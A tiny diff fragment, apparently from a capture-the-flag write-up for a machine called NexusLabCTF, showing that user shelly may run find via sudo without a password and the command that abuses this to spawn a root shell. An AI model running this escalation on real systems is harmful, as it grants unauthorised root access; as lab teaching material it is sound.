@@ -266,6 +266,7 @@ User shelly may run the following commands on NexusLabCTF:
     (ALL) NOPASSWD: /usr/bin/find
 ```
 
+
 ```shell
     sudo find . -exec /bin/sh \; -quit
 
